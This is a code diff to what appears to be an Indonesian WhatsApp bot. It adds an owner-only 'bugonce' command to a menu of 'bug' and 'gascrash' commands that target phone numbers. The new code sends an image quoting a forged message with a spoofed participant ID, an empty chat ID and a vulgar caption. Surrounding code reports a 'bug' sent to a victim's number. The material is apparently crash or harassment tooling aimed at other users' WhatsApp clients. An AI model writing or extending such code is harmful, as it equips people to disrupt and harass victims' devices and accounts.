@@ -1906,6 +1906,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 ⭔ ${prefix}catalog
 ⭔ ${prefix}bugvn
 ⭔ ${prefix}bugsticker
+⭔ ${prefix}bugonce
 ⭔ ${prefix}gascrashar [Nomer]
 ⭔ ${prefix}gasbro [Nomer]
 ⭔ ${prefix}gasbtt [Nomer]
@@ -2470,6 +2471,25 @@ adehvn = {
  hey = fs.readFileSync('anjas.webp')
 tebece.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
 await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
+break
+case 'bugonce':
+if (!isCreator) throw mess.owner
+adehvn = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `kontol`, 
+                "jpegThumbnail": thumb
+            } 
+        } 
+    }
+ hey = thumb
+tebece.sendMessage(m.chat, {image: {url: hey},viewOnce : false},{quoted: adehvn })
 break
             default:
                 if (budy.startsWith('=>')) {
